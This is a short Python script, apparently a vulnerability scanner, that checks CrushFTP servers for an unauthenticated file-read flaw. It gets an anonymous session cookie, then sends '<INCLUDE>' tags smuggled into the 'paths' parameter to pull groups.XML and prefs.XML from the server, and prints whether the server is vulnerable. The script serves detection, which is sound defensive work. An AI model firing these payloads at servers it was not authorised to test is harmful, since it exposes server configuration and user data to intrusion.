#!/usr/bin/env python3

import requests
import sys
import argparse


class CrushClient(object):
    def __init__(self, base_url="http://127.0.0.1:9090"):
        self.base = base_url

        self.token = ""

    @property
    def current_auth(self):
        if len(self.token) < 4:
            return ""
        return self.token[-4:]

    @property
    def headers(self):
        h = {}
        if self.token:
            h["Cookie"] = f"CrushAuth={self.token}; currentAuth={self.current_auth}"
            h["user_ip"] = "127.0.0.1"

        return h

    def get(self, subdir):
        r = requests.get(self.base + subdir, headers=self.headers)
        return r

    def post(self, subdir, data):
        h = self.headers
        if self.current_auth:
            data["c2f"] = self.current_auth
        r = requests.post(self.base + subdir, headers=h, data=data)
        return r

    def cmd(self, command, params={}):
        d = {"command": command, "random": "0.34712915617878926"}
        d.update(params)
        r = self.post("/WebInterface/function/", d)
        return r 

    def login(self, username, password):
        r = self.cmd("login", {"username": username, "password": password})
        c = r.cookies.get_dict()
        if "CrushAuth" not in c:
            raise ValueError("CrushAuth cookie not found (invalid credentials?)")

        self.token = c["CrushAuth"]

    def login_anonymous(self):
        r = requests.get(self.base + "/WebInterface/")
        c = r.cookies.get_dict()
        if "CrushAuth" not in c:
            raise ValueError("CrushAuth cookie not found (no anonymous access?)")

        self.token = c["CrushAuth"]


def main():
    parser = argparse.ArgumentParser(description="Scan a target for CrushFTP File Read vulnerability")
    parser.add_argument("target", type=str, help="URL to target (example: http://127.0.0.1:9090)")
    args = parser.parse_args()
    
    c = CrushClient(args.target)
    try:
        c.login_anonymous()
    except ValueError:
        print("Not vulnerable")
        return 0

    r = c.cmd("exists", {"paths": "<INCLUDE>users/MainUsers/groups.XML</INCLUDE>"})
    if "<groups" in r.text:
        print("Vulnerable")
        return 1

    r = c.cmd("exists", {"paths": "<INCLUDE>prefs.XML</INCLUDE>"})
    if "<server_prefs" in r.text:
        print("Vulnerable")
        return 1

    print("Not vulnerable")
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
